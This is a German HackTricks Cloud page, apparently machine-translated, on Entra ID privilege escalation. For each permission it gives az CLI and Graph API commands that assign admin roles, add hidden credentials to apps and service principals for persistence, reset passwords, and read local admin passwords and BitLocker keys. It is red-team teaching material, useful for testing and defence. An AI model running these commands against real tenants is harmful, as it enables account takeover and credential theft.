# Az - EntraID Privesc

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

{% hint style="info" %}
Beachten Sie, dass **nicht alle granularen Berechtigungen** der integrierten Rollen in Entra ID **f√ºr benutzerdefinierte Rollen verwendet werden k√∂nnen.**
{% endhint %}

## Rollen

### Rolle: Privileged Role Administrator <a href="#c9d4cde0-7dcc-45d5-aa95-59d198ae84b2" id="c9d4cde0-7dcc-45d5-aa95-59d198ae84b2"></a>

Diese Rolle enth√§lt die notwendigen granularen Berechtigungen, um Rollen an Prinzipale zuzuweisen und um Rollen mehr Berechtigungen zu geben. Beide Aktionen k√∂nnten missbraucht werden, um Privilegien zu eskalieren.

* Rolle einem Benutzer zuweisen:
```bash
# List enabled built-in roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directoryRoles"

# Give role (Global Administrator?) to a user
roleId="<roleId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/directoryRoles/$roleId/members/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"
```
* F√ºgen Sie einer Rolle weitere Berechtigungen hinzu:
```bash
# List only custom roles
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions" | jq '.value[] | select(.isBuiltIn == false)'

# Change the permissions of a custom role
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/<role-id>" \
--headers "Content-Type=application/json" \
--body '{
"description": "Update basic properties of application registrations",
"rolePermissions": [
{
"allowedResourceActions": [
"microsoft.directory/applications/credentials/update"
]
}
]
}'
```
## Anwendungen

### `microsoft.directory/applications/credentials/update`

Dies erm√∂glicht einem Angreifer, **Anmeldeinformationen** (Passw√∂rter oder Zertifikate) zu bestehenden Anwendungen hinzuzuf√ºgen. Wenn die Anwendung √ºber privilegierte Berechtigungen verf√ºgt, kann der Angreifer sich als diese Anwendung authentifizieren und diese Berechtigungen erlangen.
```bash
# Generate a new password without overwritting old ones
az ad app credential reset --id <appId> --append
# Generate a new certificate without overwritting old ones
az ad app credential reset --id <appId> --create-cert
```
### `microsoft.directory/applications.myOrganization/credentials/update`

Dies erm√∂glicht die gleichen Aktionen wie `applications/credentials/update`, jedoch beschr√§nkt auf Einzelverzeichnisanwendungen.
```bash
az ad app credential reset --id <appId> --append
```
### `microsoft.directory/applications/owners/update`

**Beschreibung**: Aktualisieren Sie die Eigent√ºmer von Anwendungen\
**Missbrauchspotenzial**: Indem sie sich selbst als Eigent√ºmer hinzuf√ºgen, kann ein Angreifer die Anwendung manipulieren, einschlie√ülich Anmeldeinformationen und Berechtigungen.
```bash
az ad app owner add --id <AppId> --owner-object-id <UserId>
az ad app credential reset --id <appId> --append

# You can check the owners with
az ad app owner list --id <appId>
```
## Service Principals

### `microsoft.directory/servicePrincipals/credentials/update`

Dies erm√∂glicht einem Angreifer, Anmeldeinformationen zu bestehenden Dienstprinzipalen hinzuzuf√ºgen. Wenn der Dienstprincipal erh√∂hte Berechtigungen hat, kann der Angreifer diese Berechtigungen √ºbernehmen.
```bash
az ad sp credential reset --id <sp-id> --append
```
{% hint style="danger" %}
Das neu generierte Passwort wird nicht in der Webkonsole angezeigt, daher k√∂nnte dies eine heimliche M√∂glichkeit sein, um Persistenz √ºber einen Dienstprinzipal aufrechtzuerhalten.\
√úber die API k√∂nnen sie gefunden werden mit: `az ad sp list --query '[?length(keyCredentials) > 0 || length(passwordCredentials) > 0].[displayName, appId, keyCredentials, passwordCredentials]' -o json`
{% endhint %}

Wenn Sie den Fehler `"code":"CannotUpdateLockedServicePrincipalProperty","message":"Property passwordCredentials is invalid."` erhalten, liegt das daran, dass **es nicht m√∂glich ist, die Eigenschaft passwordCredentials** des SP zu √§ndern und Sie sie zuerst entsperren m√ºssen. Daf√ºr ben√∂tigen Sie eine Berechtigung (`microsoft.directory/applications/allProperties/update`), die es Ihnen erm√∂glicht, Folgendes auszuf√ºhren:

{% code overflow="wrap" %}
```bash
az rest --method PATCH --url https://graph.microsoft.com/v1.0/applications/<sp-object-id> --body '{"servicePrincipalLockConfiguration": null}'
```
{% endcode %}

### `microsoft.directory/servicePrincipals/synchronizationCredentials/manage`

Dies erm√∂glicht einem Angreifer, Anmeldeinformationen zu bestehenden Dienstprinzipalen hinzuzuf√ºgen. Wenn der Dienstprincipal erh√∂hte Berechtigungen hat, kann der Angreifer diese Berechtigungen √ºbernehmen.
```bash
az ad sp credential reset --id <sp-id> --append
```
### `microsoft.directory/servicePrincipals/owners/update`

√Ñhnlich wie bei Anwendungen erm√∂glicht diese Berechtigung das Hinzuf√ºgen weiterer Eigent√ºmer zu einem Dienstprinzipal. Das Besitzen eines Dienstprinzipals erm√∂glicht die Kontrolle √ºber dessen Anmeldeinformationen und Berechtigungen.
```bash
# Add new owner
spId="<spId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$spId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body "{
\"@odata.id\": \"https://graph.microsoft.com/v1.0/directoryObjects/$userId\"
}"

az ad sp credential reset --id <sp-id> --append

# You can check the owners with
az ad sp owner list --id <spId>
```
{% hint style="danger" %}
Nachdem ich einen neuen Eigent√ºmer hinzugef√ºgt hatte, versuchte ich, ihn zu entfernen, aber die API antwortete, dass die DELETE-Methode nicht unterst√ºtzt wird, obwohl es die Methode ist, die Sie verwenden m√ºssen, um den Eigent√ºmer zu l√∂schen. Daher **k√∂nnen Sie heutzutage keine Eigent√ºmer entfernen**.
{% endhint %}

### `microsoft.directory/servicePrincipals/disable` und `enable`

Diese Berechtigungen erm√∂glichen es, Dienstprinzipale zu deaktivieren und zu aktivieren. Ein Angreifer k√∂nnte diese Berechtigung nutzen, um einen Dienstprinzipal zu aktivieren, auf den er irgendwie Zugriff erhalten k√∂nnte, um Privilegien zu eskalieren.

Beachten Sie, dass der Angreifer f√ºr diese Technik zus√§tzliche Berechtigungen ben√∂tigt, um den aktivierten Dienstprinzipal zu √ºbernehmen.
```bash
bashCopy code# Disable
az ad sp update --id <ServicePrincipalId> --account-enabled false

# Enable
az ad sp update --id <ServicePrincipalId> --account-enabled true
```
#### `microsoft.directory/servicePrincipals/getPasswordSingleSignOnCredentials` & `microsoft.directory/servicePrincipals/managePasswordSingleSignOnCredentials`

Diese Berechtigungen erm√∂glichen das Erstellen und Abrufen von Anmeldeinformationen f√ºr die einmalige Anmeldung, die den Zugriff auf Drittanwendungen erm√∂glichen k√∂nnten.

{% code overflow="wrap" %}
```bash
# Generate SSO creds for a user or a group
spID="<spId>"
user_or_group_id="<id>"
username="<username>"
password="<password>"
az rest --method POST \
--uri "https://graph.microsoft.com/beta/servicePrincipals/$spID/createPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$user_or_group_id\", \"credentials\": [{\"fieldId\": \"param_username\", \"value\": \"$username\", \"type\": \"username\"}, {\"fieldId\": \"param_password\", \"value\": \"$password\", \"type\": \"password\"}]}"


# Get credentials of a specific credID
credID="<credID>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/servicePrincipals/$credID/getPasswordSingleSignOnCredentials" \
--headers "Content-Type=application/json" \
--body "{\"id\": \"$credID\"}"
```
{% endcode %}

***

## Gruppen

### `microsoft.directory/groups/allProperties/update`

Diese Berechtigung erm√∂glicht es, Benutzer zu privilegierten Gruppen hinzuzuf√ºgen, was zu einer Privilegieneskalation f√ºhrt.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
**Hinweis**: Diese Berechtigung schlie√üt Entra ID rollenzuweisbare Gruppen aus.

### `microsoft.directory/groups/owners/update`

Diese Berechtigung erm√∂glicht es, Eigent√ºmer von Gruppen zu werden. Ein Eigent√ºmer einer Gruppe kann die Mitgliedschaft und Einstellungen der Gruppe steuern, was potenziell zu einer Eskalation der Berechtigungen f√ºr die Gruppe f√ºhren kann.
```bash
az ad group owner add --group <GroupName> --owner-object-id <UserId>
az ad group member add --group <GroupName> --member-id <UserId>
```
**Hinweis**: Diese Berechtigung schlie√üt Entra ID rollenzuweisbare Gruppen aus.

### `microsoft.directory/groups/members/update`

Diese Berechtigung erlaubt es, Mitglieder zu einer Gruppe hinzuzuf√ºgen. Ein Angreifer k√∂nnte sich selbst oder b√∂sartige Konten zu privilegierten Gruppen hinzuf√ºgen, was erh√∂hten Zugriff gew√§hren kann.
```bash
az ad group member add --group <GroupName> --member-id <UserId>
```
### `microsoft.directory/groups/dynamicMembershipRule/update`

Diese Berechtigung erm√∂glicht das Aktualisieren der Mitgliedschaftsregel in einer dynamischen Gruppe. Ein Angreifer k√∂nnte dynamische Regeln √§ndern, um sich selbst ohne ausdr√ºckliche Hinzuf√ºgung in privilegierte Gruppen aufzunehmen.
```bash
groupId="<group-id>"
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/groups/$groupId" \
--headers "Content-Type=application/json" \
--body '{
"membershipRule": "(user.otherMails -any (_ -contains \"security\")) -and (user.userType -eq \"guest\")",
"membershipRuleProcessingState": "On"
}'
```
**Hinweis**: Diese Berechtigung schlie√üt Entra ID rollenzuweisbare Gruppen aus.

### Dynamische Gruppen Privesc

Es k√∂nnte m√∂glich sein, dass Benutzer ihre Berechtigungen erh√∂hen, indem sie ihre eigenen Eigenschaften √§ndern, um als Mitglieder dynamischer Gruppen hinzugef√ºgt zu werden. F√ºr weitere Informationen siehe:

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

## Benutzer

### `microsoft.directory/users/password/update`

Diese Berechtigung erlaubt es, das Passwort f√ºr Nicht-Admin-Benutzer zur√ºckzusetzen, was einem potenziellen Angreifer erm√∂glichen k√∂nnte, die Berechtigungen anderer Benutzer zu erh√∂hen. Diese Berechtigung kann nicht benutzerdefinierten Rollen zugewiesen werden.
```bash
az ad user update --id <user-id> --password "kweoifuh.234"
```
### `microsoft.directory/users/basic/update`

Dieses Privileg erlaubt es, die Eigenschaften des Benutzers zu √§ndern. Es ist √ºblich, dynamische Gruppen zu finden, die Benutzer basierend auf den Werten der Eigenschaften hinzuf√ºgen. Daher k√∂nnte dieses Recht einem Benutzer erlauben, den ben√∂tigten Eigenschaftswert festzulegen, um Mitglied einer bestimmten dynamischen Gruppe zu werden und Privilegien zu eskalieren.

{% code overflow="wrap" %}
```bash
#e.g. change manager of a user
victimUser="<userID>"
managerUser="<userID>"
az rest --method PUT \
--uri "https://graph.microsoft.com/v1.0/users/$managerUser/manager/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/users/$managerUser"}'

#e.g. change department of a user
az rest --method PATCH \
--uri "https://graph.microsoft.com/v1.0/users/$victimUser" \
--headers "Content-Type=application/json" \
--body "{\"department\": \"security\"}"
```
{% endcode %}

## Bedingte Zugriffsrichtlinien & MFA-Umgehung

Fehlkonfigurierte bedingte Zugriffsrichtlinien, die MFA erfordern, k√∂nnten umgangen werden, siehe:

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

## Ger√§te

### `microsoft.directory/devices/registeredOwners/update`

Diese Berechtigung erm√∂glicht Angreifern, sich selbst als Eigent√ºmer von Ger√§ten zuzuweisen, um Kontrolle oder Zugriff auf ger√§tespezifische Einstellungen und Daten zu erlangen.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/owners/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/devices/registeredUsers/update`

Diese Berechtigung erm√∂glicht Angreifern, ihr Konto mit Ger√§ten zu verkn√ºpfen, um Zugriff zu erhalten oder Sicherheitsrichtlinien zu umgehen.
```bash
deviceId="<deviceId>"
userId="<userId>"
az rest --method POST \
--uri "https://graph.microsoft.com/v1.0/devices/$deviceId/registeredUsers/\$ref" \
--headers "Content-Type=application/json" \
--body '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/$userId"}'
```
### `microsoft.directory/deviceLocalCredentials/password/read`

Diese Berechtigung erm√∂glicht Angreifern, die Eigenschaften der gesicherten Anmeldeinformationen des lokalen Administratorkontos f√ºr Microsoft Entra-verbundene Ger√§te zu lesen, einschlie√ülich des Passworts.

{% code overflow="wrap" %}
```bash
# List deviceLocalCredentials
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials"

# Get credentials
deviceLC="<deviceLCID>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/directory/deviceLocalCredentials/$deviceLCID?\$select=credentials" \
```
{% endcode %}

## BitlockerKeys

### `microsoft.directory/bitlockerKeys/key/read`

Diese Berechtigung erm√∂glicht den Zugriff auf BitLocker-Schl√ºssel, was einem Angreifer erlauben k√∂nnte, Laufwerke zu entschl√ºsseln und die Vertraulichkeit von Daten zu gef√§hrden.

{% code overflow="wrap" %}
```bash
# List recovery keys
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys"

# Get key
recoveryKeyId="<recoveryKeyId>"
az rest --method GET \
--uri "https://graph.microsoft.com/v1.0/informationProtection/bitlocker/recoveryKeys/$recoveryKeyId?\$select=key"
```
{% endcode %}

## Andere interessante Berechtigungen (TODO)

* `microsoft.directory/applications/permissions/update`
* `microsoft.directory/servicePrincipals/permissions/update`
* `microsoft.directory/applications.myOrganization/allProperties/update`
* `microsoft.directory/applications/allProperties/update`
* `microsoft.directory/servicePrincipals/appRoleAssignedTo/update`
* `microsoft.directory/applications/appRoles/update`
* `microsoft.directory/applications.myOrganization/permissions/update`

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
